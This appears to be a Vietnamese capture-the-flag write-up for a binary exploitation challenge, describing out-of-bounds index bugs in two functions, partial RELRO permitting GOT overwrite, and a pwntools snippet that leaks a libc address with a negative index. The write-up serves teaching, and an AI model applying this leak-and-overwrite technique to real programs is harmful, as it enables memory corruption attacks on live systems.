# Phân tích code 

<img width="948" height="578" alt="Screenshot 2026-11-16 134519" src="https://github.com/user-attachments/assets/96abce11-a135-4969-b8aa-adc42f04398a" />

Chương trình cho 3 lựa chọn để tiếp tục là `input_player()` `view()` và `make_noise()`.

<img width="692" height="236" alt="image" src="https://github.com/user-attachments/assets/be0f77ea-3294-4d83-b80d-420967d69d4f" />

Đầu tiên là hàm `input_player()` cho phép nhập index để gọi read vào mảng users. Có lỗ hổng *Out of bounds* do không có bước kiểm tra index nhập vào.

<img width="741" height="287" alt="image" src="https://github.com/user-attachments/assets/cb381a8c-9e49-4e5d-945c-db2801b2ad63" />

Hàm `view()` cũng có lỗ hổng *Out of bounds* khi gọi printf trực tiếp với index chưa qua kiểm duyệt.

## Mitigation

<img width="1206" height="335" alt="image" src="https://github.com/user-attachments/assets/52dfd245-9ec9-4195-af90-265149a7408c" />

Vì RELRO không ở trạng thái FULL RELRO nên ta vẫn có thể ghi đè vào bảng GOT. 

## Khai thác 

<img width="890" height="334" alt="image" src="https://github.com/user-attachments/assets/fcf6b3e0-16dc-489a-a41b-1f1fde1fe37d" />

Mảng users nằm ở phân vùng .BSS có quyền `rw-`, nằm chung phân vùng với bảng GOT của chương trình. Đầu tiên có thể leak libc để có được các hàm libc.
Sử dụng hàm `view()` trong chương trình để in ra màn hình dữ liệu nằm trên mảng users. Vì mảng users có kích thước mỗi phần tử là 80 nên leak `__libc_start_main` 
là khả thi nhất vì từ user đến đó cách 240 BYTES về trước tương ứng với -3*80.

    p.sendafter(b'First, create a user.',b'zyan')
    p.sendlineafter(b'Input your choice:',b'2')
    p.sendlineafter(b'Input id to view: ',b'-3')
    p.recvuntil(b'Name: ')
    libc_leak=u64(p.recv(6)+b'\x00\x00')
    libc.address=libc_leak-0x29dc0
    print(hex(libc_leak))

